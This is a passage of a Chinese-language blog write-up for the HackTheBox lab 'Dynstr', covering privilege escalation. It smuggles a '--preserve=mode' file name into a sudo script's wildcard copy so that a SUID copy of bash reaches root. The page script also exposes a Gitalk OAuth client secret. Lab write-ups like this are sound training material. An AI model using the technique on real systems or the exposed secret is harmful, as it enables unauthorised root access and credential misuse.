+<h1 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a><strong>权限提升</strong></h1><img src="/2021/06/15/Hackthebox/Medium/Hackthebox-Dynstr/f62272a8-baa1-4498-bcbc-ba8ed9dd7343.png" class>
+
+<p>咱们使用sudo -l查看一下sudo权限</p>
+<p>发现可以执行bindmgr.sh文件，咱们先去看一下</p>
+<img src="/2021/06/15/Hackthebox/Medium/Hackthebox-Dynstr/23c17921-fbcc-4a7b-bb62-1a0c2bcc24e5.png" class>
+
+<p>这里咱们检查一下.version文件兵使用通配符*复制所有内容</p>
+<pre><code>find / -name &quot;.version&quot; 2&gt;/dev/null
+</code></pre>
+<img src="/2021/06/15/Hackthebox/Medium/Hackthebox-Dynstr/4c86a314-fd06-403f-9571-18c1b67bb91e.png" class>
+
+<p>我们可以看到，.version在&#x2F;etc&#x2F;文件夹中，所有这个文件会在哪里运行</p>
+<img src="/2021/06/15/Hackthebox/Medium/Hackthebox-Dynstr/14548e43-4105-48ea-a557-ffeb76742642.png" class>
+
+<p>这里我们要做的事创建.version文件并添加42到它里面</p>
+<pre><code>echo 42 &gt; .version
+</code></pre>
+<img src="/2021/06/15/Hackthebox/Medium/Hackthebox-Dynstr/f7203b34-0c1e-4e6c-83a0-e324a3d100c1.png" class>
+
+<p>首先我们复制&#x2F;bin&#x2F;bash到当前目录并使其成为SUID二进制文件</p>
+<pre><code>cp /bin/bash .
+chmod +s bash
+ls -la
+</code></pre>
+<p>下面图片错了，请见谅</p>
+<img src="/2021/06/15/Hackthebox/Medium/Hackthebox-Dynstr/7ee0e662-0abb-4023-aa84-713aae4dc45b.png" class>
+
+<p>我们创建一个名为–preserve&#x3D;mode的文件来利用它，同时复制它会保留这个目录中文件的属性，就像bash有SUID所以它会保留那些属性并将其复制到&#x2F;etc&#x2F;bind&#x2F;named.bindmgr为root权限</p>
+<pre><code>echo &gt; --preserve=mode
+ls -la
+</code></pre>
+<img src="/2021/06/15/Hackthebox/Medium/Hackthebox-Dynstr/0554747e-2646-473c-bd7e-b2ee36d8ffdd.png" class>
+
+<p>现在只需要运行sudo脚本</p>
+<pre><code>sudo /usr/local/bin/bindmgr.sh
+</code></pre>
+<img src="/2021/06/15/Hackthebox/Medium/Hackthebox-Dynstr/0989ba08-48f0-4edb-9ece-bf6c1af0581d.png" class>
+
+<p>执行.&#x2F;bash -p即可提权</p>
+<pre><code>cd /etc/bind/named.bindmgr
+./bash -p
+</code></pre>
+<img src="/2021/06/15/Hackthebox/Medium/Hackthebox-Dynstr/6f5bbe17-c37a-4042-be13-b218736777fc.png" class>
+
+<img src="/2021/06/15/Hackthebox/Medium/Hackthebox-Dynstr/6bb0d841-fc29-420b-85c9-e37e4dca6aad.png" class>
+
+<p>成功拿到root权限的flag</p>
+<p>收工睡觉</p>
+
+        </div>
+
+        <blockquote class="post-copyright">
+    
+    <footer>
+        <a href="http://www.lucifiel.com">
+            <img src="/img/avatar.jpg" alt="Lucifiel">
+            Lucifiel
+        </a>
+    </footer>
+</blockquote>
+
+        
+
+
+        <div class="post-footer">
+            
+	<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Hackthebox/" rel="tag">Hackthebox</a></li></ul>
+
+
+            
+<div class="page-share-wrap">
+    
+
+<div class="page-share" id="pageShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://www.lucifiel.com/2021/06/15/Hackthebox/Medium/Hackthebox-Dynstr/&title=《Dynstr - Hackthebox》 — Lucifiel's Blog&pic=http://www.lucifiel.com/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://www.lucifiel.com/2021/06/15/Hackthebox/Medium/Hackthebox-Dynstr/&title=《Dynstr - Hackthebox》 — Lucifiel's Blog&source=Lucifiel 技术博客" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://www.lucifiel.com/2021/06/15/Hackthebox/Medium/Hackthebox-Dynstr/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《Dynstr - Hackthebox》 — Lucifiel's Blog&url=http://www.lucifiel.com/2021/06/15/Hackthebox/Medium/Hackthebox-Dynstr/&via=http://www.lucifiel.com" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://www.lucifiel.com/2021/06/15/Hackthebox/Medium/Hackthebox-Dynstr/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+
+    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
+        <i class="icon icon-share-alt icon-lg"></i>
+    </a>
+</div>
+
+
+
+        </div>
+    </div>
+
+    
+<nav class="post-nav flex-row flex-justify-between">
+  
+    <div class="waves-block waves-effect prev">
+      <a href="/2021/06/16/Hackthebox/Hard/Hackthebox-Tentacle/" id="post-prev" class="post-nav-link">
+        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
+        <h4 class="title">Tentacle - Hackthebox</h4>
+      </a>
+    </div>
+  
+
+  
+    <div class="waves-block waves-effect next">
+      <a href="/2021/06/11/Hackthebox/Medium/Hackthebox-Pit/" id="post-next" class="post-nav-link">
+        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
+        <h4 class="title">Pit - Hackthebox</h4>
+      </a>
+    </div>
+  
+</nav>
+
+
+
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<section class="comments" id="comments">
+    <div id="gitalk-container"></div>
+    <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+    <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+    <script>
+        var id = location.pathname
+        if (location.pathname.length > 50) {
+          id = location.pathname.replace(/\/\d+\/\d+\/\d+\//, '').replace('/', '').substring(0, 50)
+        }
+        const gitalk = new Gitalk({
+          clientID: 'cf0a9809323df14a9168',
+          clientSecret: 'a30d7a21bf6d88b7ad5c1f5d1bfc45881c49b2ed',
+          repo: 'LucifielHack.github.io',
+          owner: 'LucifielHack',
+          admin: ['LucifielHack'],
+          id: id,      // Ensure uniqueness and length less than 50
+          title: document.title.split('|')[0],
+          distractionFreeMode: false  // Facebook-like distraction free mode
+        })
+
+        gitalk.render('gitalk-container')
+    </script>
+</section>
+
+
+
+
+</article>
+
+
+
+</div>
+
+        <footer class="footer">
+    <div class="top">
+        
+<p>
+    <span id="busuanzi_container_site_uv" style='display:none'>
+        站点总访客数：<span id="busuanzi_value_site_uv"></span>
+    </span>
+    <span id="busuanzi_container_site_pv" style='display:none'>
+        站点总访问量：<span id="busuanzi_value_site_pv"></span>
+    </span>
+</p>
+
+
+        <p>
+            <!--- 
+                <span><a href="/atom.xml" target="_blank" class="rss" title="rss"><i class="icon icon-lg icon-rss"></i></a></span>
+            
+            <span>footer.license</span> --->
+        </p>
+    </div>
+    <div class="bottom">
+        <p><span>Lucifiel &copy; 2020 - 2023</span>
+            <span>
+                
+                Power by Lucifiel</a>
+            </span>
+        </p>
+    </div>
+</footer>
+
+    </main>
+    <div class="mask" id="mask"></div>
+<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>
+
+
+
+<div class="global-share" id="globalShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://www.lucifiel.com/2021/06/15/Hackthebox/Medium/Hackthebox-Dynstr/&title=《Dynstr - Hackthebox》 — Lucifiel's Blog&pic=http://www.lucifiel.com/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://www.lucifiel.com/2021/06/15/Hackthebox/Medium/Hackthebox-Dynstr/&title=《Dynstr - Hackthebox》 — Lucifiel's Blog&source=Lucifiel 技术博客" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://www.lucifiel.com/2021/06/15/Hackthebox/Medium/Hackthebox-Dynstr/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《Dynstr - Hackthebox》 — Lucifiel's Blog&url=http://www.lucifiel.com/2021/06/15/Hackthebox/Medium/Hackthebox-Dynstr/&via=http://www.lucifiel.com" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://www.lucifiel.com/2021/06/15/Hackthebox/Medium/Hackthebox-Dynstr/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+<div class="page-modal wx-share" id="wxShare">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAN4AAADeCAAAAAB3DOFrAAACsElEQVR42u3aS04EMQwFQO5/aZBYIaHufrbjGZCqV6P5BFcWsXH88RE/n9/P73d+vv/7O/lv71dIPh09eHh4eK3Qr577gO5XuPo02abqmpcR4uHh4a3x7g/ihyWKqSL/W/MkhIeHh/deXkJKws3X78WDh4eH9194eSlcDhEPDw/vT/LysJLmbNKAyFsVya8O9Frw8PDwYl6vWfDe14v3e3h4eHiDW/XJkV0dOMibF4Vo8fDw8BZ490XtpCkwH66qpoHCfwx4eHh4A17eYqgu3Vu5Otr1sDIeHh7eGm8ynFqlTjYrh+Hh4eHt8XpXUHlBPDn689bGwwABHh4e3lFefuneu4jqjV5VE8BlPHh4eHgLvLyEzdu7G9tUbQ1f5j08PDy8Me8UoDdkcKq92+y14OHh4Q141Wv+vM3aGwW4L76Tdwp9FDw8PLxDvEmgk8ZBPoSatIPx8PDwNnjzC/s8oGpD4VTTGQ8PD2+PV73CzxNJtXzPU0t1W/Hw8PDO8vLmQrUJ2xs46L1+yHt4eHh4C7xqQVwtxHtN4ep38PDw8PZ4OaAX+oEDfVBY4+Hh4b2LlyeDfByqWqznwwd4eHh427xJa6B5hd/ClIPOHzw8PLwBr3pMTxJAvmXV7buMDQ8PD+8or9pgnbRlE0a1qfFgwcPDwzvKy2/Jqu9Ui+/kuC83lPHw8PCWefMrq0namGzE5Wp4eHh4C7xqAZ2UwmcHCHqJBA8PD2+P91l8esV03nhNNqjQIsHDw8Nb4E1u3vOLrnx4a55O8PDw8F7D6yWDammerJwf+s37PTw8PLyjvOqhnARUHR3oZbCH7+Dh4eG9lZdX4kmpPSnWCxHi4eHh/RnepAh+TVLBw8PD2+ZVWwbl2YS4UZuw80s1PDw8vA1eL4h8xmmeDOYNCzw8PLxDvC/rolS5m9JtwAAAAABJRU5ErkJggg==" alt="微信分享二维码">
+</div>
+
+
+
+
+    <script src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
+<script>
+var BLOG = { ROOT: '/', SHARE: true, REWARD: false };
+
+
+</script>
+
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/main.min.js"></script>
+
+
+<div class="search-panel" id="search-panel">
+    <ul class="search-result" id="search-result"></ul>
+</div>
+<template id="search-tpl">
+<li class="item">
+    <a href="{path}" class="waves-block waves-effect">
+        <div class="title ellipsis" title="{title}">{title}</div>
+        <div class="flex-row flex-middle">
+            <div class="tags ellipsis">
+                {tags}
+            </div>
+            <time class="flex-col time">{date}</time>
+        </div>
+    </a>
+</li>
+</template>
+
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/search.min.js" async></script>
+
+
+
+
+
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+
+
+
+
+
+</body>
+</html>
